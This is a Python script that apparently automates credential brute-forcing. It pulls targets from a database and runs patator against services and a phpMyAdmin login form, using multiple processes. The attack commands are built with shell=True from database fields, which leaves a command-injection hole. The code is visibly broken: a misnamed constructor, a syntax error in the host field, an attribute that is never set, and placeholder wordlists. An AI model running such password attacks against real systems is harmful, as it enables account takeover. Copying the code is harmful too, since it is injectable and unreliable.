import subprocess
from urllib.parse import urlparse
from pony.orm import db_session, select
from multiprocessing import Pool
from datetime import datetime
from src.enums.wordlist_options import WordlistOptions
from src.models.target import Target
from src.utils.protocols import tls_protocols_with_authentication


class BruteforcerFactory:

    def __init(self, target: Target):
        if "form" in target.mode:
            return HttpFormBruteforcer(target)
        else:
            return Bruteforcer(target)


class Bruteforcer:
    def __init__(self, target: Target):
        parsed_url = urlparse(target.url)
        self.port = parsed_url.port
        self.host = parsed_url.hostname
        self.tls = self.__get_tls(parsed_url.scheme)
        self.wordlists = self.__get_final_wordlists(
            target.pass_user_lists, target.additional_keywords)
        self.module = self.__get_module(target.mode)

    def __get_module(self, target_mode):
        return target_mode

    def __get_tls(self, protocol):
        return (protocol in tls_protocols_with_authentication)

    def __get_final_wordlists(self, wordlists, keywords=[]):
        return {
            WordlistOptions.USER: ['user'],
            WordlistOptions.PASS: ['pass'],
            WordlistOptions.USERPASS: ['user:pass']}

    def execute(self):
        pass


class StandardBruteforcer(Bruteforcer):

    def execute(self):
        cmd = f"patator.py {self.target.mode} host={self.target.} port={self.target.port} user=FILE0 password=FILE1 0={self.target.userlist_path} 1={self.target.passlist_path}"

        process = subprocess.Popen(
            cmd, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode != 0:
            print(
                f"Error while executing bruteforce for target {self.target.id}: {stderr.decode()}")
        else:
            print(
                f"Bruteforce completed for target {self.target.id}: {stdout.decode()}")


class HttpFormBruteforcer(Bruteforcer):

    def execute(self):
        cmd = f"patator.py http_fuzz url={self.target.url} method=POST follow=1 accept_cookie=1 body='pma_username=FILE0&pma_password=FILE1&server=1&lang=en' 0={self.target.userlist_path} 1={self.target.passlist_path} -x ignore:fgrep='Cannot log in to the MySQL server'"

        process = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode != 0:
            print(
                f"Error while executing bruteforce for target {self.target.id}: {stderr.decode()}")
        else:
            print(
                f"Bruteforce completed for target {self.target.id}: {stdout.decode()}")


def launch_bruteforce(bruteforcer: Bruteforcer):
    bruteforcer.execute()


@db_session
def fetch_targets_and_start_bruteforce(number_of_threads: int):
    targets = select(t for t in Target)[:]
    bruteforcers = []

    for target in targets:
        if "forms" in target.mode:
            bruteforcers.append(HttpFormBruteforcer(target))
        else:
            bruteforcers.append(StandardBruteforcer(target))

    with Pool(number_of_threads) as pool:
        pool.map(launch_bruteforce, bruteforcers)


if __name__ == "__main__":
    number_of_threads = 4  # You can configure the number of threads here
    fetch_targets_and_start_bruteforce(number_of_threads)
